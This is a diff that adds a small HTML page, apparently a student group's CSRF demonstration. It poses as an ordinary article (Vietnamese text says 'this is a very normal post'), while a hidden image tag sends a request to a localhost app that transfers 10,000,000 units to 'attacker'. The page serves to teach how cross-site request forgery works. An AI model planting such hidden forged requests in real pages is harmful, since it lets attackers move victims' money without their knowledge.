@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <link rel="stylesheet" href="/css/app.min.css" />
+        <title>CSRF Demo - Nhóm CSRF</title>
+    </head>
+    <body>
+        <div
+            class="
+                flex flex-col
+                items-center
+                justify-center
+                text-gray-700
+                border-r-2 border-gray-100
+                w-screen
+                h-screen
+                bg-white
+            "
+        >
+            <div class="bg-white rounded shadow-md p-12 mt-12 border-2 border-gray-100">
+                <div class="mb-5 text-xl font-semibold">Demo CSRF Attack</div>
+                <div>Đây là một bài viết rất bình thường.</div>
+                <img
+                    src="http://localhost:3001/create?receiver=attacker&amount=10000000"
+                    class="hidden"
+                    alt="Đây là một ví dụ về tấn công CSRF"
+                />
+            </div>
+        </div>
+    </body>
+</html>
